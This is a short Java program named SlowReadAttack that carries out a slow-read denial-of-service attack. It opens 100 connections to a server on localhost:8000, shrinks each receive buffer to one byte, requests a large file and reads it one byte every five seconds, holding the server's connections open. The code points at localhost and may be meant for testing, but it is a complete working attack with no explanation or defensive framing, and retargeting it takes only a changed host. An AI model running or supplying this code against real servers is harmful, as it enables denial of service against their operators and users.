import module java.base;
public class SlowReadAttack{//Say NO to Java 8!!!
	public static void main(String[] args) throws Exception{
		Socket sockets[]=new Socket[100];//100 Devices
		for(int i=0;i<100;++i){
			sockets[i]=new Socket("localhost",8000);
			sockets[i].setReceiveBufferSize(1);
		}
		System.out.println(sockets[0].getReceiveBufferSize());
		String str="GET /large_test_file.bin HTTP/1.1\r\nHost: localhost:8000\r\n\r\n";
		byte[] binary=str.getBytes();
		for(int i=0;i<100;++i){
			sockets[i].getOutputStream().write(binary);
			sockets[i].getOutputStream().flush();
		}
		a:while(true){
			for(int i=0;i<100;++i){
				if(sockets[i].getInputStream().read()==-1){
					break a;
				}
			}
			Thread.sleep(5000);
		}
	}
}
